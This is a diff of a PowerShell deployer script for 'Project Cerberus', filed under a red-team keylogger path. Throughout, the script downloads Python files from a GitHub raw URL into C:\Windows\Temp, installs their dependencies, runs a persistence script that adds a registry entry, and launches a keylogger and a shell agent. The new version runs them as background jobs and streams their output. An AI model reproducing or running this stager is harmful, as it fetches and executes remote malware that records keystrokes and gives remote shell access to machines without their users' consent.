@@ -1,35 +1,55 @@
-# Project Cerberus - Stage 2 Deployer
+# Project Cerberus - Stage 2 Deployer (DEBUG VERSION)
 
-$dir = "C:\Windows\Temp\cerberus"
+$dir  = "C:\Windows\Temp\cerberus"
 $base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"
-$log = "C:\Windows\Temp\cerberus_deploy.log"
+$log  = "C:\Windows\Temp\cerberus_deploy.log"
 
-"[+] Deploy started $(Get-Date)" | Out-File $log
+function Log($msg) {
+    $line = "[$(Get-Date -Format 'HH:mm:ss')] $msg"
+    Write-Host $line -ForegroundColor Cyan
+    $line | Out-File $log -Append
+}
+
+Log "Deploy started"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
-"[+] Directory created" | Out-File $log -Append
+Log "Directory ready: $dir"
 
-Invoke-WebRequest -Uri "$base/config.py"        -OutFile "$dir\config.py"
-"[+] config.py downloaded" | Out-File $log -Append
-Invoke-WebRequest -Uri "$base/keylogger.py"     -OutFile "$dir\keylogger.py"
-"[+] keylogger.py downloaded" | Out-File $log -Append
-Invoke-WebRequest -Uri "$base/persistence.py"   -OutFile "$dir\persistence.py"
-"[+] persistence.py downloaded" | Out-File $log -Append
-Invoke-WebRequest -Uri "$base/shell_agent.py"   -OutFile "$dir\shell_agent.py"
-"[+] shell_agent.py downloaded" | Out-File $log -Append
-Invoke-WebRequest -Uri "$base/requirements.txt" -OutFile "$dir\requirements.txt"
-"[+] requirements.txt downloaded" | Out-File $log -Append
+$files = @("config.py", "keylogger.py", "persistence.py", "shell_agent.py", "requirements.txt")
+foreach ($f in $files) {
+    Invoke-WebRequest -Uri "$base/$f" -OutFile "$dir\$f"
+    Log "Downloaded: $f"
+}
 
-pip install -r "$dir\requirements.txt" -q
-"[+] pip install done" | Out-File $log -Append
+Log "Running pip install..."
+pip install -r "$dir\requirements.txt"
+Log "pip install done"
 
+Log "Running persistence.py..."
 python "$dir\persistence.py"
-"[+] persistence.py ran" | Out-File $log -Append
+Log "persistence.py done (registry entry added)"
 
-Start-Process python -ArgumentList "$dir\shell_agent.py" -WorkingDirectory $dir -WindowStyle Normal
-"[+] shell_agent launched" | Out-File $log -Append
+Log "Launching shell_agent.py and keylogger.py..."
 
-Start-Process python -ArgumentList "$dir\keylogger.py" -WorkingDirectory $dir -WindowStyle Normal
-"[+] keylogger launched" | Out-File $log -Append
+$job1 = Start-Job -ScriptBlock { python "C:\Windows\Temp\cerberus\shell_agent.py" }
+$job2 = Start-Job -ScriptBlock { python "C:\Windows\Temp\cerberus\keylogger.py" }
 
-"[+] Deploy complete $(Get-Date)" | Out-File $log -Append
+Log "Both agents running. Streaming output below..."
+Write-Host "----------------------------------------" -ForegroundColor Yellow
+Write-Host "  SHELL AGENT + KEYLOGGER LIVE OUTPUT   " -ForegroundColor Yellow
+Write-Host "  (close this window to stop both)      " -ForegroundColor Yellow
+Write-Host "----------------------------------------" -ForegroundColor Yellow
+
+while ($true) {
+    $out1 = Receive-Job $job1
+    $out2 = Receive-Job $job2
+
+    if ($out1) { Write-Host "[shell_agent] $out1" -ForegroundColor Green }
+    if ($out2) { Write-Host "[keylogger]   $out2" -ForegroundColor Magenta }
+
+    # If either job crashed, report it
+    if ($job1.State -eq "Failed") { Write-Host "[!] shell_agent crashed!" -ForegroundColor Red; break }
+    if ($job2.State -eq "Failed") { Write-Host "[!] keylogger crashed!"   -ForegroundColor Red; break }
+
+    Start-Sleep -Milliseconds 500
+}
